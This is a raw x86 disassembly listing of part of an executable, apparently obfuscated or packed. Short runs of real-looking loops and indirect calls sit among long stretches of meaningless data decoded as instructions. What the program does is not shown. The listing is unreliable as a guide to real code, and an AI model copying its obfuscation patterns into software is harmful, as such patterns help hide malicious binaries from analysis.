  403c66:	lock jmp 0x71b0:0xd133a40b
  403c6e:	jnp    0x403c7e
  403c70:	xchg   esp,eax
  403c71:	sub    eax,0x94180c58
  403c76:	jb     0x403c6e
  403c78:	sti    
  403c79:	and    eax,0x1aa64b9e
  403c7e:	push   edi
  403c7f:	pop    ecx
  403c80:	es sbb esi,esi
  403c83:	add    BYTE PTR [esi+0x4fc3e9a4],dh
  403c89:	xor    al,0xcc
  403c8b:	or     eax,DWORD PTR [ebx]
  403c8d:	or     DWORD PTR [ebx],edi
  403c8f:	mov    al,ds:0x266d8b2f
  403c94:	sahf   
  403c95:	fs pop ds
  403c97:	or     ecx,DWORD PTR ss:[edi]
  403c9a:	outs   dx,DWORD PTR ds:[esi]
  403c9b:	lods   eax,DWORD PTR ds:[esi]
  403c9c:	imul   esi,eax,0xc22c6e44
  403ca2:	fstp   TBYTE PTR [esi+ebp*4+0x69]
  403ca6:	sbb    BYTE PTR [eax],ch
  403ca8:	sbb    al,0xc1
  403caa:	mov    DWORD PTR [ecx+0x48],edi
  403cad:	mov    esi,0x83e0b2c8
  403cb2:	inc    esp
  403cb3:	(bad)  
  403cb4:	mov    BYTE PTR [esi-0x47],0x86
  403cb8:	push   ss
  403cb9:	ficomp DWORD PTR [edx+0x5b562289]
  403cbf:	les    esi,FWORD PTR [esi+eiz*8-0x74977b01]
  403cc6:	xor    ebp,esp
  403cc8:	(bad)  [ebx-0x5a0e2b9a]
  403cce:	retf   0x9dda
  403cd1:	mov    eax,0xec4aef51
  403cd6:	jge    0x403d18
  403cd8:	call   0x5859:0xbc69d04d
  403cdf:	push   ebp
  403ce0:	lahf   
  403ce1:	into   
  403ce2:	loop   0x403c76
  403ce4:	xor    eax,0xd014c0e7
  403ce9:	pop    edi
  403cea:	fcomp  DWORD PTR [esi]
  403cec:	mov    esp,0x542b6edb
  403cf1:	jbe    0x403d52
  403cf3:	jae    0x403d2e
  403cf5:	xchg   edi,eax
  403cf6:	loopne 0x403d38
  403cf8:	cmp    DWORD PTR [eax],esi
  403cfa:	adc    DWORD PTR [edx+eiz*4],ecx
  403cfd:	mov    al,0x3f
  403cff:	out    0x76,ax
  403d02:	jp     0x403ccb
  403d04:	test   eax,0x3ad3a2d2
  403d09:	popf   
  403d0a:	push   eax
  403d0b:	cmp    BYTE PTR [ebp-0x50013373],dh
  403d11:	mov    BYTE PTR [ebx],0xd1
  403d14:	and    DWORD PTR ds:0x4248ce,0x0
  403d1e:	mov    ebx,DWORD PTR ds:0x4248ce
  403d24:	inc    ebx
  403d25:	mov    DWORD PTR ds:0x4248ce,ebx
  403d2b:	cmp    DWORD PTR ds:0x4248ce,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x44300c
  403d41:	cmp    DWORD PTR ds:0x4248ce,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x44898c
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x44b6e0,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x41074b
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x44e40c
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x44e418,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x44b6d4
  403d9a:	or     DWORD PTR ds:0x448990,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x448994,0x16
  403dad:	cmp    DWORD PTR ds:0x448994,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x448994,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x4107a9
  403dcf:	call   DWORD PTR ds:0x44335c
  403dd5:	mov    ebx,DWORD PTR ds:0x448994
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x448994,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x4248ca,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x4248ca
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x4248ca,ebx
  403e03:	cmp    DWORD PTR ds:0x4248ca,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x4248ca,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x4430d8
  403e4f:	cmp    DWORD PTR ds:0x4248ca,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x4248ca
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x4248ca,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	repnz test DWORD PTR [edx],edi
  403eae:	mov    BYTE PTR [esi+0x19],bl
  403eb1:	jl     0x403f2f
  403eb3:	xor    al,0x7f
  403eb5:	jl     0x403f33
  403eb7:	and    al,0xdc
  403eb9:	xchg   BYTE PTR ds:0x8e60bee6,bl
  403ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec0:	cwde   
  403ec1:	mov    al,ds:0x64584cc0
  403ec6:	jg     0x403f35
  403ec8:	push   ecx
  403ec9:	ins    BYTE PTR es:[edi],dx
  403eca:	add    eax,0x8f60e87c
  403ecf:	and    al,0xc9
  403ed1:	cmp    eax,0xf0771e1
  403ed6:	inc    edx
  403ed7:	cmp    ebx,DWORD PTR [eax+0x36]
  403eda:	push   ebx
  403edb:	lock mov ebx,0x9487680b
  403ee1:	push   eax
  403ee2:	pop    esi
  403ee3:	loop   0x403ee6
  403ee5:	cmp    eax,0xab4a8057
  403eea:	aam    0xee
  403eec:	push   esi
  403eed:	push   0x63
  403eef:	cld    
  403ef0:	iret   
  403ef1:	aam    0xbf
  403ef3:	jb     0x403e7d
  403ef5:	loop   0x403eb3
  403ef7:	mov    dh,0x79
  403ef9:	iret   
  403efa:	xchg   ecx,eax
  403efb:	pop    esp
  403efc:	inc    eax
  403efd:	out    dx,eax
  403efe:	int    0x58
  403f00:	sbb    ah,bl
  403f02:	xchg   BYTE PTR [ebx],ch
  403f04:	adc    ecx,DWORD PTR [esi]
  403f06:	xchg   edx,ebx
  403f08:	cwde   
  403f09:	iret   
  403f0a:	out    dx,al
  403f0b:	mov    ds:0x23687684,eax
  403f10:	outs   dx,DWORD PTR ds:[esi]
  403f11:	ins    DWORD PTR es:[edi],dx
  403f12:	fldenv [edx-0x5aa6393f]
  403f18:	sub    BYTE PTR [ecx-0x6b],ah
  403f1b:	xchg   ebx,edi
  403f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f1e:	and    BYTE PTR fs:[ecx+esi*8-0x25],dh
  403f23:	inc    edi
  403f24:	ins    DWORD PTR es:[edi],dx
  403f25:	inc    ebp
  403f26:	iret   
  403f27:	outs   dx,BYTE PTR ds:[esi]
  403f28:	into   
  403f29:	xchg   esi,eax
  403f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2b:	jb     0x403eb4
  403f2d:	add    BYTE PTR [eax+0xd],0x3d
  403f31:	inc    edi
  403f32:	jmp    0x403f56
  403f34:	aam    0x80
  403f36:	add    dh,BYTE PTR [ecx-0x77]
  403f39:	dec    eax
  403f3a:	js     0x403f28
  403f3c:	push   esp
  403f3d:	ss pop ss
  403f3f:	sub    eax,0x6df913a7
  403f44:	pop    edi
  403f45:	(bad)  
  403f46:	sbb    ebp,DWORD PTR [esi-0x4b658727]
  403f4c:	(bad)  
  403f50:	idiv   BYTE PTR [edi+eiz*4+0x5f84cbd7]
  403f57:	and    al,0x3d
  403f59:	test   al,0x85
  403f5b:	shl    DWORD PTR [ecx],0x60
  403f5e:	ja     0x403ee9
  403f60:	and    BYTE PTR [eax+eax*4-0x1ea78aa3],0x2e
  403f68:	sahf   
  403f69:	jae    0x403fdd
  403f6b:	and    dl,dh
  403f6d:	sbb    BYTE PTR [ebx],bl
  403f6f:	mov    BYTE PTR [eax+ebp*1+0x44],al
  403f73:	sub    eax,0x2d1d4b7c
  403f78:	hlt    
  403f79:	outs   dx,DWORD PTR ds:[esi]
  403f7a:	mov    ch,0x73
  403f7c:	mov    ebp,0x7f64a7ab
  403f81:	adc    al,0xef
  403f83:	jae    0x403ff1
  403f85:	stc    
  403f86:	daa    
  403f87:	mov    edi,0xba8487d8
  403f8c:	daa    
  403f8d:	test   BYTE PTR [eax],al
  403f8f:	sbb    eax,0xe933146
  403f94:	std    
  403f95:	cmp    BYTE PTR [edx+0x70],bl
  403f98:	mov    dh,0xd
  403f9a:	and    ecx,eax
  403f9c:	outs   dx,DWORD PTR ds:[esi]
  403f9d:	retf   0x2f5e
  403fa0:	(bad)  
  403fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa2:	sbb    bl,BYTE PTR [ecx]
  403fa4:	cmp    ebx,eax
  403fa6:	xchg   ebx,eax
  403fa7:	and    eax,0x4ee81140
  403fac:	retf   0x1a41
  403faf:	sbb    DWORD PTR [esi+0x5e],ebp
  403fb2:	ins    BYTE PTR es:[edi],dx
  403fb3:	repz bound ebx,QWORD PTR [ebp+0x9]
  403fb7:	push   ebx
  403fb8:	lock or eax,0xa3798ffc
  403fbe:	jmp    DWORD PTR [esi+0x43]
  403fc1:	retf   
  403fc2:	inc    esi
  403fc3:	dec    ecx
  403fc4:	arpl   WORD PTR [ebp-0x7c],di
  403fc7:	sbb    DWORD PTR [edi],eax
  403fc9:	pop    ebp
  403fca:	lods   al,BYTE PTR ds:[esi]
  403fcb:	sbb    bl,dh
  403fcd:	arpl   WORD PTR [ebp-0xd],ax
  403fd0:	xor    al,0x0
  403fd2:	jne    0x403f5c
  403fd4:	dec    ebp
  403fd5:	retf   
  403fd6:	stos   DWORD PTR es:[edi],eax
  403fd7:	sub    BYTE PTR [ebx+edi*2-0x1d7eda8c],0x25
  403fdf:	mov    ebp,0x5c9b2cbf
  403fe4:	rcl    DWORD PTR ds:[eax+ecx*8-0x30],cl
  403fe9:	or     ebx,DWORD PTR [ecx-0x45765e95]
  403fef:	jae    0x403f80
  403ff1:	xor    eax,0xb225484c
  403ff6:	and    bl,BYTE PTR [ebx-0x772e9dc7]
  403ffc:	lea    ebx,[ecx+esi*1+0x33]
  404000:	shl    BYTE PTR [ebx],1
  404002:	clc    
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae ebx,DWORD PTR [esi+eax*8-0x63]
  404051:	add    DWORD PTR [esi],edx
  404053:	sbb    edi,DWORD PTR [esp+edi*2+0x34]
  404057:	jg     0x4040d5
  404059:	jl     0x4040b8
  40405b:	(bad)  
  40405c:	and    eax,esi
  40405e:	mov    ds:0xee80099d,al
  404063:	push   cs
  404064:	pop    esp
  404065:	jl     0x40402d
  404067:	push   esp
  404068:	mov    WORD PTR [ebp+0x5ef9ad3d],ss
  40406e:	mov    cl,0xc
  404070:	and    bl,cl
  404072:	lahf   
  404073:	jo     0x404078
  404075:	push   edi
  404076:	in     al,dx
  404077:	adc    al,0x5d
  404079:	xchg   edi,eax
  40407a:	call   0x32de974e
  40407f:	out    dx,eax
  404080:	push   es
  404081:	test   DWORD PTR [ecx-0x18fe1e80],ebp
  404087:	jns    0x4040fc
  404089:	lods   al,BYTE PTR ds:[esi]
  40408a:	mov    ebx,0x9f6c4ddc
  40408f:	pop    eax
  404090:	iret   
  404091:	sub    eax,0xdde39d62
  404096:	inc    esi
  404097:	mov    ebx,0xec1164d
  40409c:	mov    cl,0xac
  40409e:	push   cs
  40409f:	push   ss
  4040a0:	pop    es
  4040a1:	int3   
  4040a2:	mov    ah,0x97
  4040a4:	xlat   BYTE PTR ds:[ebx]
  4040a5:	stos   DWORD PTR es:[edi],eax
  4040a6:	mov    bh,0xda
  4040a8:	jmp    0x6095:0xad8e6dea
  4040af:	adc    DWORD PTR [ebp+0x17fcaf9a],0xffffffcd
  4040b6:	mov    cl,0xb4
  4040b8:	xor    al,0x37
  4040ba:	mov    esi,0x784f7c59
  4040bf:	sbb    BYTE PTR [eax+0x65ed577b],dl
  4040c5:	in     eax,dx
  4040c6:	jbe    0x40408e
  4040c8:	loop   0x404109
  4040ca:	inc    esp
  4040cb:	cmp    ebx,DWORD PTR [ebp+0x11]
  4040ce:	add    dl,al
  4040d0:	stos   DWORD PTR es:[edi],eax
  4040d1:	pop    esp
  4040d2:	mov    al,ds:0xb6dcd455
  4040d7:	(bad)  
  4040d8:	in     al,dx
  4040d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040da:	fwait
  4040db:	and    bl,al
  4040dd:	cs je  0x404120
  4040e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040e1:	ror    bl,cl
  4040e3:	repz in eax,dx
  4040e5:	test   al,0x62
  4040e7:	lea    ecx,[esi+0x4c]
  4040ea:	inc    ecx
  4040eb:	leave  
  4040ec:	(bad)  
  4040ed:	or     DWORD PTR [ebx+0x4f],ebp
  4040f0:	push   0x7d
  4040f2:	arpl   WORD PTR [ecx-0x62594b3c],bx
  4040f8:	les    ebp,FWORD PTR [esi+0x13]
  4040fb:	pop    esp
  4040fc:	push   ebp
  4040fd:	pop    ds
  4040fe:	xor    eax,0xcc5de96d
  404103:	push   esp
  404104:	pop    ds
  404105:	cmp    al,0xa
  404107:	mov    dh,0x14
  404109:	pop    esp
  40410a:	mov    eax,ds:0x48a29e0a
  40410f:	daa    
  404110:	loope  0x40416d
  404112:	dec    ecx
  404113:	(bad)  
  404115:	or     esp,DWORD PTR [edx+0x78]
  404118:	or     eax,DWORD PTR [ebp-0x5b696cbf]
  40411e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40411f:	fistp  WORD PTR [ebx]
  404121:	mov    esp,0x9acc9a1a
  404126:	out    0x53,al
  404128:	std    
  404129:	push   es
  40412a:	jns    0x404160
  40412c:	imul   esi,DWORD PTR [edx],0xc093ab37
  404132:	les    ebx,FWORD PTR [ebx-0xf073517]
  404138:	in     eax,0x94
  40413a:	lods   eax,DWORD PTR ds:[esi]
  40413b:	mov    esp,0x851706a3
  404140:	push   esi
  404141:	adc    edx,DWORD PTR [ebx]
  404143:	js     0x4040f7
  404145:	jmp    0x4e4498ec
  40414a:	dec    edx
  40414c:	inc    eax
  40414d:	and    eax,0x8729f00a
  404152:	jb     0x4040e1
  404154:	inc    ebx
  404155:	push   0x5d995f16
  40415a:	mov    al,0x3
  40415c:	push   edi
  40415d:	imul   edx,DWORD PTR [ebp-0x16bbd81d],0x3a
  404164:	xor    DWORD PTR [eax+0xbcbe857],ebx
  40416a:	push   ss
  40416b:	inc    edx
  40416c:	mov    ds:0x4a306f8b,eax
  404171:	jnp    0x4041cf
  404173:	(bad)  
  404174:	fisttp DWORD PTR [edi]
  404176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404177:	push   ecx
  404178:	daa    
  404179:	add    ah,al
  40417b:	push   cs
  40417c:	mov    esi,0x25e15f4b
  404181:	std    
  404182:	out    0xcf,eax
  404184:	call   0x7cdb1d2f
  404189:	loopne 0x4041fc
  40418b:	aad    0xcb
  40418d:	and    BYTE PTR [esi],ah
  40418f:	pop    esi
  404190:	sub    eax,0x80f8da04
  404195:	pop    ebx
  404196:	in     eax,0x6
  404198:	pop    esi
  404199:	iret   
  40419a:	and    ebp,DWORD PTR [eax+0x148a5575]
  4041a0:	es mov bl,0xf
  4041a3:	xchg   DWORD PTR [eax],ecx
  4041a5:	add    BYTE PTR [eax],al
  4041a7:	add    BYTE PTR [ebx+0x7fe9d055],cl
  4041ad:	add    al,0x0
  4041af:	add    BYTE PTR [ebx+0x7d8bc855],cl
  4041b5:	cld    
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041cc:	push   0x1aee4d8c
  4041d1:	jl     0x40424f
  4041d3:	xor    al,0x7f
  4041d5:	jl     0x404253
  4041d7:	lds    ebx,FWORD PTR [edi]
  4041d9:	cld    
  4041da:	inc    ecx
  4041db:	aad    0xd
  4041dd:	unpckhps xmm0,XMMWORD PTR [edi-0x330ee9d9]
  4041e4:	test   eax,0xfd852ead
  4041e9:	retf   0x98ff
  4041ec:	mov    BYTE PTR [ebp+0x4d2e35f6],dl
  4041f2:	das    
  4041f3:	or     dh,ah
  4041f5:	cdq    
  4041f6:	clc    
  4041f7:	(bad)  
  4041f8:	xchg   ebp,eax
  4041f9:	dec    edi
  4041fa:	mov    ?,WORD PTR [edx]
  4041fc:	icebp  
  4041fd:	sub    DWORD PTR [edi+esi*2-0x4054250d],ecx
  404204:	scas   al,BYTE PTR es:[edi]
  404205:	push   ebp
  404206:	jl     0x404216
  404208:	add    eax,0x8aee8281
  40420d:	les    ebp,FWORD PTR [edi]
  40420f:	mov    gs,WORD PTR [ecx+0x614f3c74]
  404215:	dec    ebp
  404216:	(bad)  
  404217:	mov    cl,0x7c
  404219:	mov    bl,0xe1
  40421b:	lods   al,BYTE PTR ds:[esi]
  40421c:	es ja  0x404277
  40421f:	call   0xc255:0xc8667f21
  404226:	fadd   QWORD PTR [edx+eiz*4-0x16]
  40422a:	inc    esp
  40422b:	or     ebx,DWORD PTR [esi+0x6c]
  40422e:	(bad)  
  40422f:	loope  0x404248
  404231:	scas   al,BYTE PTR es:[edi]
  404232:	fsub   QWORD PTR [ecx+0x1b]
  404235:	mov    ds:0x497b4540,eax
  40423a:	hlt    
  40423b:	adc    bl,BYTE PTR [eax+0x30937268]
  404241:	(bad)  
  404242:	mov    edx,0xd0403277
  404247:	ins    BYTE PTR es:[edi],dx
  404248:	mov    ah,0xa4
  40424a:	ds je  0x4042a6
  40424d:	mov    dl,0xaf
  40424f:	mov    edi,0x57a553ca
  404254:	push   esp
  404255:	add    eax,0x97e2d3e0
  40425a:	arpl   WORD PTR [esi],di
  40425c:	fild   DWORD PTR [esp+edi*2-0x27]
  404260:	xchg   BYTE PTR [esi-0x57e88c7e],al
  404266:	xchg   al,ah
  404268:	dec    BYTE PTR [edi-0x24bbb32f]
  40426e:	add    al,0x88
  404270:	into   
  404271:	or     DWORD PTR [eax+0x1f277057],ebx
  404277:	das    
  404278:	das    
  404279:	or     BYTE PTR [edi+edi*8-0x27],dl
  40427d:	je     0x4042ae
  40427f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404280:	or     al,0xd2
  404282:	pop    ebp
  404283:	inc    DWORD PTR [edx+0x55]
  404286:	outs   dx,DWORD PTR ds:[esi]
  404287:	in     al,dx
  404288:	jae    0x4042bc
  40428a:	fmul   DWORD PTR [ecx]
  40428c:	ret    0x2468
  40428f:	std    
  404290:	fs mov dh,0x39
  404293:	arpl   ax,sp
  404295:	sbb    al,0xf
  404297:	or     bh,al
  404299:	les    ebx,FWORD PTR [edi+0x5e]
  40429c:	sub    BYTE PTR [edx+0x7d],bh
  40429f:	ds dec eax
  4042a1:	test   eax,0x24f233ee
  4042a6:	test   BYTE PTR [ebp-0x49f9420d],0xbc
  4042ad:	xchg   esp,eax
  4042ae:	gs dec ecx
  4042b0:	(bad)  
  4042b1:	fs sar ebx,0x63
  4042b5:	je     0x4042cd
  4042b7:	push   0xffffff82
  4042b9:	mov    ecx,0x12d68cf3
  4042be:	clc    
  4042bf:	jmp    0x404328
  4042c1:	inc    edx
  4042c2:	into   
  4042c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c4:	mov    edx,0xa4014c20
  4042c9:	mov    esp,0xf2b40a5d
  4042ce:	mov    ecx,0x8b44891
  4042d3:	xor    dl,BYTE PTR [edi-0x4]
  4042d6:	or     eax,0x27085e99
  4042db:	and    dh,BYTE PTR [ebx-0x5902c9a3]
  4042e1:	cmp    al,0xac
  4042e3:	xchg   di,ax
  4042e5:	loopne 0x40431e
  4042e7:	mov    eax,ds:0x208b1e04
  4042ec:	les    ebx,FWORD PTR [ebp-0x37]
  4042ef:	aam    0x48
  4042f1:	(bad)  
  4042f2:	cld    
  4042f3:	leave  
  4042f4:	jae    0x4042ea
  4042f6:	scas   al,BYTE PTR es:[edi]
  4042f7:	mov    dl,0x1d
  4042f9:	sahf   
  4042fa:	jno    0x40428e
  4042fc:	outs   dx,BYTE PTR ds:[esi]
  4042fd:	gs or  ecx,ecx
  404300:	sbb    eax,0x93f693b9
  404305:	lods   al,BYTE PTR ds:[esi]
  404306:	mov    ecx,0x6f39ba8e
  40430b:	push   edi
  40430c:	out    0x4,eax
  40430e:	dec    esp
  40430f:	scas   al,BYTE PTR es:[edi]
  404310:	frstor [edx+ecx*8+0x9]
  404314:	scas   eax,DWORD PTR es:[edi]
  404315:	sub    al,BYTE PTR [ebx+0x163d19f5]
  40431b:	test   al,0xe2
  40431d:	mov    esp,0x3f90386
  404322:	ror    DWORD PTR [edi],1
  404324:	scas   eax,DWORD PTR es:[edi]
  404325:	xlat   BYTE PTR ds:[ebx]
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	jg     0x1de6b291
  404340:	jl     0x4043be
  404342:	xor    al,0x7f
  404344:	jl     0x4043c2
  404346:	fs jno 0x404371
  404349:	and    edi,DWORD PTR [eax]
  40434b:	push   ecx
  40434c:	pop    ecx
  40434d:	push   cs
  40434e:	cdq    
  40434f:	retf   0xfb33
  404352:	test   al,0x3d
  404354:	mov    ebp,0x4c59834b
  404359:	add    DWORD PTR [edx+0x620aa24c],edi
  40435f:	pusha  
  404360:	push   ds
  404361:	fbld   TBYTE PTR [edx]
  404363:	xchg   edx,esp
  404365:	cmp    ch,BYTE PTR ds:[esi+0x5a]
  404369:	jl     0x404373
  40436b:	out    0x27,eax
  40436d:	inc    ebp
  40436e:	inc    ebx
  40436f:	sbb    al,0xde
  404371:	pushf  
  404372:	pop    si
  404374:	lea    ecx,[edx+0x1f]
  404377:	jmp    0x4ffe:0x4a0d261f
  40437e:	outs   dx,BYTE PTR ds:[esi]
  40437f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404380:	js     0x404374
  404382:	ds out 0xc6,eax
  404385:	pop    ebx
  404386:	outs   dx,BYTE PTR ds:[esi]
  404387:	sub    eax,0xfa06a33a
  40438c:	cmovo  edi,edi
  40438f:	mov    cl,0xce
  404391:	push   esp
  404392:	call   0x87ebf9c0
  404397:	lock das 
  404399:	shl    DWORD PTR [esi+0x54836ba1],1
  40439f:	les    esi,FWORD PTR [esi+0x52]
  4043a2:	ror    BYTE PTR [edi],0x57
  4043a5:	(bad)  
  4043a6:	fidiv  WORD PTR [ebx-0x6]
  4043a9:	ins    BYTE PTR es:[edi],dx
  4043aa:	(bad)  
  4043ab:	scas   eax,DWORD PTR es:[edi]
  4043ac:	jne    0x404382
  4043ae:	dec    eax
  4043af:	or     ebx,DWORD PTR ds:0xbc3924f9
  4043b5:	cmp    edi,DWORD PTR [eax+ebx*8+0xcba581f]
  4043bc:	xchg   DWORD PTR [ebp+edx*2-0x6d],edi
  4043c0:	push   esi
  4043c1:	enter  0x873b,0x9
  4043c5:	xor    BYTE PTR [ebp-0x10],dl
  4043c8:	dec    ebp
  4043c9:	retf   0x9992
  4043cc:	bound  ebx,QWORD PTR [eax]
  4043ce:	mov    BYTE PTR [ebx-0x50],ch
  4043d1:	and    DWORD PTR [esi+0x48],esp
  4043d4:	imul   esi,DWORD PTR [ebx-0x19],0xffffffe5
  4043d8:	rcr    DWORD PTR [ecx],0xb
  4043db:	adc    DWORD PTR ds:0x77d84cff,eax
  4043e1:	fcmovbe st,st(7)
  4043e3:	(bad)  
  4043e5:	add    eax,0x9399dac7
  4043ea:	pop    ss
  4043eb:	mov    ecx,0x462ab421
  4043f0:	jecxz  0x4043f0
  4043f2:	cmp    BYTE PTR [eax+0x2aba955a],ah
  4043f8:	pop    ebp
  4043f9:	mov    ebp,0xf7d36fd4
  4043fe:	mov    dl,0xf8
  404400:	into   
  404401:	je     0x4043f7
  404403:	push   edx
  404404:	stos   BYTE PTR es:[edi],al
  404405:	fisttp DWORD PTR [eax]
  404407:	nop
  404408:	sbb    BYTE PTR [esp+edi*4],cl
  40440b:	sbb    DWORD PTR [esi+0x25],0x31e9308e
  404412:	mov    cl,BYTE PTR [esi]
  404414:	jmp    0x4043f0
  404416:	ret    
  404417:	dec    ebp
  404418:	pop    ebp
  404419:	jp     0x40443b
  40441b:	sar    BYTE PTR [eax+edx*4+0x4b],0x7d
  404420:	out    dx,eax
  404421:	xor    DWORD PTR [edi+0x7b],esi
  404424:	mov    WORD PTR [eax+eax*4-0x554564a9],0x8fd4
  40442e:	popf   
  40442f:	adc    eax,0xb2913175
  404434:	sbb    eax,0x84cec7e
  404439:	aas    
  40443a:	pushf  
  40443b:	stos   BYTE PTR es:[edi],al
  40443c:	jl     0x40442c
  40443e:	cmp    BYTE PTR [edx],dl
  404440:	ds inc ebp
  404442:	aaa    
  404443:	out    0xe7,al
  404445:	mov    dl,0x6d
  404447:	mov    bh,BYTE PTR [eax+edx*1]
  40444a:	or     bh,BYTE PTR [esi-0x1932894a]
  404450:	or     eax,0x7b9f25cd
  404455:	aad    0x47
  404457:	adc    eax,0x914df5b3
  40445c:	nop
  40445d:	fiadd  DWORD PTR [ebx-0xc]
  404460:	mov    dl,0x3c
  404462:	pop    ds
  404463:	xor    ecx,DWORD PTR [ecx]
  404465:	sbb    al,0xa4
  404467:	xchg   ebx,eax
  404468:	or     eax,0xfdbe8307
  40446d:	pop    edi
  40446e:	jecxz  0x4044e1
  404470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404471:	push   esi
  404472:	xchg   esp,eax
  404473:	mov    ah,0xf8
  404475:	inc    ebp
  404476:	fstp   TBYTE PTR [eax-0x65]
  404479:	imul   eax,DWORD PTR [edx-0x5633c96d],0xc54b985c
  404483:	lods   eax,DWORD PTR ds:[esi]
  404484:	add    eax,DWORD PTR [esi+eiz*1-0x19]
  404488:	ror    esp,0x1
  40448b:	mov    dh,0x69
  40448d:	mov    ebx,DWORD PTR ds:[ebp-0x10]
  404491:	jmp    0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	push   es
  4044a3:	(bad)  
  4044a4:	(bad)  [edx+0x7c7c1f7e]
  4044aa:	xor    al,0x7f
  4044ac:	jl     0x40452a
  4044ae:	and    DWORD PTR [ecx-0xe],esi
  4044b1:	jle    0x404517
  4044b3:	xlat   BYTE PTR ds:[ebx]
  4044b4:	jno    0x40450e
  4044b6:	jb     0x404464
  4044b8:	xchg   esp,eax
  4044b9:	xadd   BYTE PTR [eax+0x64],dl
  4044bd:	add    BYTE PTR [edx],0xda
  4044c0:	stos   DWORD PTR es:[edi],eax
